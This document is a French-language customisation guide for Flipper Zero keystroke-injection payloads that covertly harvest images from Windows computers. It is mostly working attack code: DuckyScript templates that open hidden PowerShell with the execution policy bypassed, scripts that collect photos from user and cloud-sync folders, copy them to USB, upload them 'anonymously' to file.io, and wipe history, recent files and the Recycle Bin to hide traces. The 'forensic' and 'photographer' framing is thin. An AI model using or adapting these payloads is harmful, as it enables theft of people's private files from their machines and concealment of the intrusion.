# Guide de Personnalisation - Flipper Zero Image Extractor

## Vue d'ensemble

Ce guide vous explique comment personnaliser et adapter les payloads d'extraction d'images selon vos besoins spécifiques.

## Paramètres de Base Modifiables

### 1. Délais et Timing

#### DEFAULT_DELAY
```ducky
DEFAULT_DELAY 300    # Délai standard (300ms)
DEFAULT_DELAY 500    # Pour systèmes plus lents
DEFAULT_DELAY 150    # Pour systèmes rapides
```

#### DELAY Personnalisés
```ducky
GUI r
DELAY 500           # Augmentez si le menu Run tarde à s'ouvrir
STRING cmd
ENTER  
DELAY 1500          # Augmentez si CMD met du temps à s'ouvrir
```

### 2. Extensions de Fichiers

#### Extensions Haute Priorité
```powershell
$highPriorityFormats = @('.jpg', '.jpeg', '.png', '.raw', '.tiff')
```

#### Extensions Complètes
```powershell
$allFormats = @(
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
    '.ico', '.svg', '.tiff', '.tif', '.raw', '.heic',
    '.jfif', '.psd', '.ai', '.webm', '.avif'
)
```

#### Ajout d'Extensions Personnalisées
```powershell
# Ajoutez vos formats spécifiques
$customFormats = @('.cr2', '.nef', '.arw', '.dng')  # RAW camera
$allFormats += $customFormats
```

### 3. Emplacements de Recherche

#### Emplacements de Base
```powershell
$basicLocations = @(
    '$env:USERPROFILE\Pictures',
    '$env:USERPROFILE\Desktop',
    '$env:USERPROFILE\Documents',
    '$env:USERPROFILE\Downloads'
)
```

#### Emplacements Avancés
```powershell
$advancedLocations = @(
    '$env:USERPROFILE\OneDrive',
    '$env:USERPROFILE\Dropbox',
    '$env:USERPROFILE\Google Drive',
    '$env:PUBLIC\Pictures',
    'C:\Users\Public\Documents'
)
```

#### Emplacements Professionnels
```powershell
$professionalLocations = @(
    '$env:USERPROFILE\Adobe\*',
    '$env:APPDATA\Adobe\*\Assets',
    '$env:LOCALAPPDATA\Microsoft\Windows\Themes',
    'C:\ProgramData\Microsoft\User Account Pictures'
)
```

## Filtres Personnalisés

### 1. Filtres par Taille

#### Filtre Taille Basique
```powershell
# Exclure les très petits fichiers (probablement des icônes)
$files = $files | Where-Object { $_.Length -gt 10KB }

# Exclure les très gros fichiers (probablement des vidéos)
$files = $files | Where-Object { $_.Length -lt 100MB }
```

#### Filtre Taille Avancé
```powershell
function Get-SizeCategory($file) {
    $size = $file.Length
    if ($size -lt 50KB) { return "Icon" }
    elseif ($size -lt 500KB) { return "Thumbnail" } 
    elseif ($size -lt 5MB) { return "Standard" }
    elseif ($size -lt 25MB) { return "HighRes" }
    else { return "Professional" }
}
```

### 2. Filtres par Date

#### Derniers Jours
```powershell
$dateFilter = (Get-Date).AddDays(-7)    # 7 derniers jours
$dateFilter = (Get-Date).AddDays(-30)   # 30 derniers jours
$dateFilter = (Get-Date).AddMonths(-6)  # 6 derniers mois
```

#### Plage de Dates Spécifique
```powershell
$startDate = Get-Date "2024-01-01"
$endDate = Get-Date "2024-12-31"
$files = $files | Where-Object { 
    $_.LastWriteTime -gt $startDate -and $_.LastWriteTime -lt $endDate 
}
```

### 3. Filtres par Nom

#### Exclusion de Fichiers Système
```powershell
$systemFilePatterns = @(
    '*thumb*', '*cache*', '*temp*', 
    '*.$*', '*~*', '*.tmp'
)

$files = $files | Where-Object { 
    $name = $_.Name.ToLower()
    -not ($systemFilePatterns | Where-Object { $name -like $_ })
}
```

#### Inclusion de Motifs Spécifiques
```powershell
$targetPatterns = @(
    '*photo*', '*img*', '*picture*', 
    '*screenshot*', '*capture*'
)

$files = $files | Where-Object {
    $name = $_.Name.ToLower()
    $targetPatterns | Where-Object { $name -like $_ }
}
```

## Personnalisation des Sorties

### 1. Noms de Fichiers

#### Format Timestamp Simple
```powershell
$newName = (Get-Date -Format "yyyyMMdd_HHmmss") + "_" + $file.Name
```

#### Format avec Source
```powershell
$source = $file.Directory.Name
$newName = $source + "_" + $file.LastWriteTime.ToString("MMdd") + "_" + $file.Name
```

#### Format avec Métadonnées
```powershell
$size = [math]::Round($file.Length/1KB, 0)
$newName = $file.LastWriteTime.ToString("yyyyMMdd") + "_" + $size + "KB_" + $file.Name
```

### 2. Organisation en Dossiers

#### Par Date
```powershell
$yearFolder = $file.LastWriteTime.Year
$monthFolder = $file.LastWriteTime.ToString("MM-MMMM")
$targetPath = ".\$yearFolder\$monthFolder"
New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
```

#### Par Taille
```powershell
$sizeCategory = Get-SizeCategory $file
$targetPath = ".\By_Size\$sizeCategory"
New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
```

#### Par Source
```powershell
$sourceApp = Get-SourceApplication $file.DirectoryName
$targetPath = ".\By_Source\$sourceApp"
New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
```

### 3. Formats de Sortie

#### Archive ZIP
```powershell
# Création d'une archive automatique
$zipPath = "$env:USERPROFILE\Desktop\Images_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($extractPath, $zipPath)
```

#### Export vers Clé USB
```powershell
# Détection automatique de clé USB
$usbDrives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
if ($usbDrives) {
    $usbPath = $usbDrives[0].DeviceID + "\Extracted_Images"
    robocopy $extractPath $usbPath /E /R:1 /W:1
}
```

## Modules Optionnels Personnalisables

### 1. Module de Chiffrement

```powershell
function Encrypt-File($filePath, $password) {
    $encrypted = $filePath + ".enc"
    $key = [System.Text.Encoding]::UTF8.GetBytes($password.PadRight(32).Substring(0,32))
    
    # Chiffrement AES simple
    $aes = [System.Security.Cryptography.AesManaged]::new()
    $aes.Key = $key
    $aes.Mode = 'CBC'
    
    # [Code de chiffrement détaillé ici]
}
```

### 2. Module d'Upload Cloud

```powershell
function Upload-ToAnonymous($filePath) {
    # Upload vers service anonyme (file.io, etc.)
    try {
        $uri = "https://file.io"
        $response = Invoke-RestMethod -Uri $uri -Method Post -InFile $filePath
        return $response.link
    } catch {
        return $null
    }
}
```

### 3. Module de Nettoyage

```powershell
function Clear-Traces {
    # Effacement des traces d'activité
    Clear-History
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
```

## Templates de Payloads Personnalisés

### Template Minimaliste

```ducky
REM Payload Personnalisé - Extraction Simple
DEFAULT_DELAY 300

GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {
ENTER
STRING $path='$env:USERPROFILE\Desktop\.temp_extract';
STRING New-Item -ItemType Directory -Path $path -Force;
STRING Get-ChildItem '$env:USERPROFILE\Pictures' -Include '*.jpg','*.png' -Recurse |
STRING ForEach-Object { Copy-Item $_.FullName -Destination $path };
STRING }"
ENTER
```

### Template Avancé avec Interface

```ducky
REM Payload Personnalisé - Extraction avec Interface
DEFAULT_DELAY 300

GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000

STRING title Mon Extracteur Personnalisé
ENTER
STRING cd %USERPROFILE%\Desktop
ENTER
STRING mkdir MonExtraction >nul 2>&1
ENTER
STRING cd MonExtraction
ENTER

STRING powershell.exe -ExecutionPolicy Bypass -Command "& {
ENTER
STRING # [Votre code PowerShell personnalisé ici]
STRING }"
ENTER
DELAY 2000

STRING explorer .
ENTER
STRING pause >nul
ENTER
STRING exit
ENTER
```

## Variables d'Environnement Utiles

### Variables Windows Standard
```ducky
%USERPROFILE%          # C:\Users\[username]
%APPDATA%              # AppData\Roaming
%LOCALAPPDATA%         # AppData\Local
%TEMP%                 # Dossier temporaire
%PUBLIC%               # C:\Users\Public
%PROGRAMDATA%          # C:\ProgramData
%COMPUTERNAME%         # Nom de l'ordinateur
%USERNAME%             # Nom d'utilisateur
%DATE%                 # Date actuelle
%TIME%                 # Heure actuelle
```

### Variables PowerShell Utiles
```powershell
$env:USERPROFILE       # Profil utilisateur
$env:COMPUTERNAME      # Nom PC
$env:USERNAME          # Utilisateur
$env:PROCESSOR_ARCHITECTURE  # Architecture (x64, x86)
$PSVersionTable.PSVersion    # Version PowerShell
[Environment]::OSVersion     # Version Windows
```

## Tests et Validation

### Script de Test Personnalisé
```powershell
# Test de votre configuration personnalisée
function Test-CustomConfig {
    $locations = @($env:USERPROFILE + "\Pictures")
    $extensions = @("*.jpg", "*.png")
    
    foreach ($location in $locations) {
        if (Test-Path $location) {
            $count = (Get-ChildItem $location -Include $extensions -Recurse).Count
            Write-Host "$location : $count images trouvées"
        }
    }
}
```

### Métriques de Performance
```powershell
# Mesure des performances de votre payload
$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
# [Votre code d'extraction ici]
$stopwatch.Stop()
Write-Host "Temps d'exécution: $($stopwatch.Elapsed.TotalMinutes) minutes"
```

## Bonnes Pratiques

1. **Testez toujours** vos modifications sur un système de test
2. **Sauvegardez** les versions originales avant modification
3. **Commentez** vos personnalisations pour la maintenance
4. **Utilisez des noms explicites** pour vos variables et fonctions
5. **Gérez les erreurs** avec des try-catch appropriés
6. **Optimisez les délais** selon votre environnement cible

## Exemples d'Utilisation

### Extraction pour Photographe
```powershell
# Configuration spécialisée pour fichiers RAW de photos
$photoExtensions = @('*.cr2', '*.nef', '*.arw', '*.dng', '*.raf')
$photoLocations = @(
    '$env:USERPROFILE\Pictures',
    'C:\Adobe\Lightroom\*',
    'D:\Photos\*'  # Disque externe typique
)
```

### Extraction pour Designer
```powershell
# Configuration pour fichiers de design
$designExtensions = @('*.psd', '*.ai', '*.sketch', '*.fig', '*.png', '*.jpg')
$designLocations = @(
    '$env:USERPROFILE\Adobe\*',
    '$env:USERPROFILE\Creative Cloud Files\*',
    '$env:USERPROFILE\Sketch\*'
)
```

### Extraction Forensique
```powershell
# Configuration pour analyse forensique
$allExtensions = @('*.*')  # Tous les fichiers
$allLocations = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root + "*" }
$includeHidden = $true
$includeSystem = $true
```